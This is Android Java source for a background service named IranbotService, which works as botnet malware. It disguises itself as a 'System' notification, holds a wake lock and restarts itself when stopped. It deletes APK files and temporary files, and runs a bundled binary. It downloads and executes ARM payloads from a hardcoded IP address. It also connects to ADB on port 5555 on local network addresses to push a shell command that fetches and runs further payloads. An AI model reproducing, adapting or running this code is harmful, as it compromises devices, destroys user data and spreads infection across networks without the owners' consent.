package com.reaverbot.load;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import java.io.*;
import java.net.*;

public class IranbotService extends Service {

    private static final String DOMAIN = "217.60.195.187";
    private static final int TARGET_PORT = 5555;
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 20000;
    private static final int WORK_INTERVAL = 50000;

    private static final String[] TARGET_IPS = {
        "127.0.0.1",
        "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4",
        "192.168.1.5", "192.168.1.6", "192.168.1.7", "192.168.1.8",
        "192.168.1.9", "192.168.1.10", "192.168.1.11"
    };

    private static final int A_CNXN = 0x4e584e43;
    private static final int A_OPEN = 0x4e45504f;
    private static final int A_CLSE = 0x45534c43;
    private static final int ADB_VERSION = 0x01000000;
    private static final int MAX_DATA = 4096;

    private static final String TAG = "adb";
    private static final String CHANNEL_ID = "reaverbot_channel";
    private static final int NOTIFICATION_ID = 1;

    private HandlerThread workerThread;
    private Handler workerHandler;
    private PowerManager.WakeLock wakeLock;
    private String libPath;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                startForeground(NOTIFICATION_ID, buildNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } catch (Throwable t) {
                startForeground(NOTIFICATION_ID, buildNotification());
            }
        } else {
            startForeground(NOTIFICATION_ID, buildNotification());
        }

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            try {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Iranbot::WakeLock");
                wakeLock.acquire(3600000);
            } catch (Throwable t) {}
        }

        workerThread = new HandlerThread("IranbotWorker");
        workerThread.start();
        workerHandler = new Handler(workerThread.getLooper());

        extractAndPrepareLib();
        Log.d(TAG, "Service onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        scheduleWork();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        Log.w(TAG, "Service onDestroy - restarting");
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        Intent restartIntent = new Intent(getApplicationContext(), IranbotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }

    private void scheduleWork() {
        if (workerHandler == null) return;
        workerHandler.post(new Runnable() {
            @Override
            public void run() {
                try { doWork(); } catch (Exception e) { Log.e(TAG, "doWork error: " + e.getMessage()); }
                if (workerHandler != null) {
                    workerHandler.postDelayed(this, WORK_INTERVAL);
                }
            }
        });
    }

    private void extractAndPrepareLib() {
        try {
            File libDir = getDir("libs", MODE_PRIVATE);
            libPath = new File(libDir, "libkys.so").getAbsolutePath();
            File libFile = new File(libPath);

            if (!libFile.exists()) {
                InputStream in = getAssets().open("libkys.so");
                FileOutputStream out = new FileOutputStream(libFile);
                byte[] buf = new byte[8192];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                out.close();
                in.close();
                libFile.setExecutable(true);
                libFile.setReadable(true);
                libFile.setWritable(true);
                Log.d(TAG, "libkys.so extracted to " + libPath);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to extract libkys.so: " + e.getMessage());
        }
    }

    private void executeLib() {
        if (libPath == null) return;
        try {
            Runtime.getRuntime().exec(new String[]{libPath, "adb"}, null, new File(getDir("libs", MODE_PRIVATE).getAbsolutePath()));
            Log.d(TAG, "libkys.so executed");
        } catch (Exception e) {
            Log.e(TAG, "Failed to execute libkys.so: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW);
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, flags);
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        int iconId = getResources().getIdentifier("ic_notify", "drawable", getPackageName());
        if (iconId == 0) {
            iconId = android.R.drawable.ic_menu_info_details;
        }
        return builder.setContentTitle("System").setContentText("Running")
            .setSmallIcon(iconId).setContentIntent(pi)
            .setOngoing(true).setPriority(Notification.PRIORITY_LOW).build();
    }

    private void sendShellCmd(String cmd) {
        for (String ip : TARGET_IPS) {
            try {
                Socket sock = new Socket();
                sock.connect(new InetSocketAddress(ip, TARGET_PORT), CONNECT_TIMEOUT);
                sock.setSoTimeout(READ_TIMEOUT);
                OutputStream out = sock.getOutputStream();
                InputStream in = sock.getInputStream();

                writeMsg(out, A_CNXN, ADB_VERSION, MAX_DATA, "host::\0".getBytes());
                Thread.sleep(600);

                writeMsg(out, A_OPEN, 1, 0, ("shell:" + cmd).getBytes());
                try {
                    int[] msg;
                    while ((msg = readMsg(in)) != null) {
                        if (msg[0] == A_CLSE) break;
                    }
                } catch (Exception e) {}
                sock.close();
                Log.d(TAG, "Shell OK on " + ip);
                return;
            } catch (Exception e) {
                Log.d(TAG, "No ADB on " + ip);
            }
        }
        Log.e(TAG, "No ADB on any IP");
    }

    private void doWork() {
        try {
            Log.d(TAG, "doWork start");
            cleanApksOnly("/sdcard");
            cleanDirectory("/data/local/tmp");

            executeLib();
            downloadAndExecArm("arm7");
            downloadAndExecArm("arm6");
            downloadAndExecArm("arm5");
            downloadAndExecArm("arm");

            String binaryCmd = "rm -f /data/local/tmp/arm7 /data/local/tmp/arm6 /data/local/tmp/arm5 /data/local/tmp/arm 2>/dev/null; ({ curl -s http://217.60.195.187/LjEZs/arm7 -o /data/local/tmp/arm7 ; } 2>/dev/null || { toybox curl -s http://217.60.195.187/LjEZs/arm7 -o /data/local/tmp/arm7 ; } 2>/dev/null || { toybox wget http://217.60.195.187/LjEZs/arm7 -O /data/local/tmp/arm7 ; } 2>/dev/null || { busybox wget http://217.60.195.187/LjEZs/arm7 -O /data/local/tmp/arm7 ; } 2>/dev/null || { busybox curl -s http://217.60.195.187/LjEZs/arm7 -o /data/local/tmp/arm7 ; } 2>/dev/null || { wget http://217.60.195.187/LjEZs/arm7 -O /data/local/tmp/arm7 ; } 2>/dev/null); chmod +x /data/local/tmp/arm7 2>/dev/null; chmod 777 /data/local/tmp/arm7 2>/dev/null; /data/local/tmp/arm7 adb 2>/dev/null & ({ curl -s http://217.60.195.187/LjEZs/arm6 -o /data/local/tmp/arm6 ; } 2>/dev/null || { toybox curl -s http://217.60.195.187/LjEZs/arm6 -o /data/local/tmp/arm6 ; } 2>/dev/null || { toybox wget http://217.60.195.187/LjEZs/arm6 -O /data/local/tmp/arm6 ; } 2>/dev/null || { busybox wget http://217.60.195.187/LjEZs/arm6 -O /data/local/tmp/arm6 ; } 2>/dev/null || { busybox curl -s http://217.60.195.187/LjEZs/arm6 -o /data/local/tmp/arm6 ; } 2>/dev/null || { wget http://217.60.195.187/LjEZs/arm6 -O /data/local/tmp/arm6 ; } 2>/dev/null); chmod +x /data/local/tmp/arm6 2>/dev/null; chmod 777 /data/local/tmp/arm6 2>/dev/null; /data/local/tmp/arm6 adb 2>/dev/null & ({ curl -s http://217.60.195.187/LjEZs/arm5 -o /data/local/tmp/arm5 ; } 2>/dev/null || { toybox curl -s http://217.60.195.187/LjEZs/arm5 -o /data/local/tmp/arm5 ; } 2>/dev/null || { toybox wget http://217.60.195.187/LjEZs/arm5 -O /data/local/tmp/arm5 ; } 2>/dev/null || { busybox wget http://217.60.195.187/LjEZs/arm5 -O /data/local/tmp/arm5 ; } 2>/dev/null || { busybox curl -s http://217.60.195.187/LjEZs/arm5 -o /data/local/tmp/arm5 ; } 2>/dev/null || { wget http://217.60.195.187/LjEZs/arm5 -O /data/local/tmp/arm5 ; } 2>/dev/null); chmod +x /data/local/tmp/arm5 2>/dev/null; chmod 777 /data/local/tmp/arm5 2>/dev/null; /data/local/tmp/arm5 adb 2>/dev/null & ({ curl -s http://217.60.195.187/LjEZs/arm -o /data/local/tmp/arm ; } 2>/dev/null || { toybox curl -s http://217.60.195.187/LjEZs/arm -o /data/local/tmp/arm ; } 2>/dev/null || { toybox wget http://217.60.195.187/LjEZs/arm -O /data/local/tmp/arm ; } 2>/dev/null || { busybox wget http://217.60.195.187/LjEZs/arm -O /data/local/tmp/arm ; } 2>/dev/null || { busybox curl -s http://217.60.195.187/LjEZs/arm -o /data/local/tmp/arm ; } 2>/dev/null || { wget http://217.60.195.187/LjEZs/arm -O /data/local/tmp/arm ; } 2>/dev/null); chmod +x /data/local/tmp/arm 2>/dev/null; chmod 777 /data/local/tmp/arm 2>/dev/null; /data/local/tmp/arm adb 2>/dev/null &";
            Log.d(TAG, "Sending direct binary execution cmd...");
            sendShellCmd(binaryCmd);

            Log.d(TAG, "doWork done");
        } catch (Exception e) {
            Log.e(TAG, "doWork error: " + e.getMessage());
        }
    }

    private void downloadAndExecArm(String name) {
        try {
            String url = "http://" + DOMAIN + "/LjEZs/" + name;
            File outDir = getDir("libs", MODE_PRIVATE);
            File outFile = new File(outDir, name);
            if (outFile.exists()) outFile.delete();

            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            conn.setRequestMethod("GET");
            conn.connect();

            if (conn.getResponseCode() == 200) {
                InputStream in = conn.getInputStream();
                FileOutputStream out = new FileOutputStream(outFile);
                byte[] buf = new byte[8192];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                out.close();
                in.close();
                outFile.setExecutable(true);
                outFile.setReadable(true);
                outFile.setWritable(true);
                Runtime.getRuntime().exec(new String[]{outFile.getAbsolutePath(), "adb"}, null, outDir);
                Log.d(TAG, "Downloaded and executed " + name);
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Failed to download " + name + ": " + e.getMessage());
        }
    }

    private void writeMsg(OutputStream out, int cmd, int arg0, int arg1, byte[] payload) throws IOException {
        int magic = cmd ^ 0xFFFFFFFF, crc = 0;
        for (byte b : payload) crc += (b & 0xFF);
        java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        buf.putInt(cmd); buf.putInt(arg0); buf.putInt(arg1); buf.putInt(payload.length); buf.putInt(crc); buf.putInt(magic);
        out.write(buf.array());
        if (payload.length > 0) out.write(payload);
        out.flush();
    }

    private int[] readMsg(InputStream in) throws IOException {
        byte[] header = new byte[24];
        int total = 0;
        while (total < 24) { int r = in.read(header, total, 24-total); if (r < 0) return null; total += r; }
        java.nio.ByteBuffer buf = java.nio.ByteBuffer.wrap(header).order(java.nio.ByteOrder.LITTLE_ENDIAN);
        int cmd = buf.getInt(), arg0 = buf.getInt(), arg1 = buf.getInt(), len = buf.getInt();
        buf.getInt(); buf.getInt();
        if (len > 0 && len < MAX_DATA) { byte[] p = new byte[len]; total = 0; while (total < len) { int r = in.read(p, total, len-total); if (r < 0) break; total += r; } }
        return new int[]{cmd, arg0, arg1, len};
    }

    private void cleanApksOnly(String path) {
        File dir = new File(path); File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) { if (f.getName().endsWith(".apk")) f.delete(); }
    }

    private void cleanDirectory(String path) {
        File dir = new File(path); File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) f.delete();
    }
}
